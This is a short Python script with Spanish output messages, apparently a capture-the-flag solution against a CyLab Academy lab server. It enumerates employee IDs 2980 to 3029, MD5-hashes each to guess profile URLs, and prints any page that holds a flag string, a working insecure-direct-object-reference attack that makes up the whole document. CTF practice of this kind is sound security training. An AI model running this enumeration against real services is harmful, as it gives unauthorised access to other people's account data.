import requests
import hashlib

BASE_URL = "http://chatelaine.cylabacademy.net:46099"

print("[*] Probando IDs del 2980 al 3030 (alrededor de 3000)...")

for emp_id in range(2980, 3030):
    h = hashlib.md5(str(emp_id).encode()).hexdigest()
    url = f"{BASE_URL}/profile/user/{h}"
    r = requests.get(url)
    
    if r.status_code == 200:
        print(f"[+] ID {emp_id} (MD5: {h}) -> Status: {r.status_code}")
        print("    Contenido:", r.text.strip())
        if "academy{" in r.text or "picoctf{" in r.text or "flag" in r.text.lower():
            if "Only top-tier users can access the flag" not in r.text or "academy{" in r.text:
                print("=" * 60)
                print(f"[!] ¡FLAG ENCONTRADA EN ID {emp_id}!")
                print(r.text)
                print("=" * 60)
                break
